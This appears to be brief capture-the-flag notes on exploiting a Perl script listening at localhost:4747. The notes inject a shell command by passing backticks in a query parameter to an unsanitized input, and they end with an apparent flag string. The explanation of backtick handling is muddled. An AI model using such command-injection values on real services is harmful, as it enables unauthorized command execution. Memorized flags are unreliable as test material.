* we got a pearl file 
* gonna escape and run getflag.
* cat the .pl 
* we can see that it is open at localhost:4747
* curl localhost:4747?x=\`getflag\` execute getflag (it escape because pearl escape the ` character and it doesn't sanitize the input here)

ne2searoevaevoem4ov4ar8ap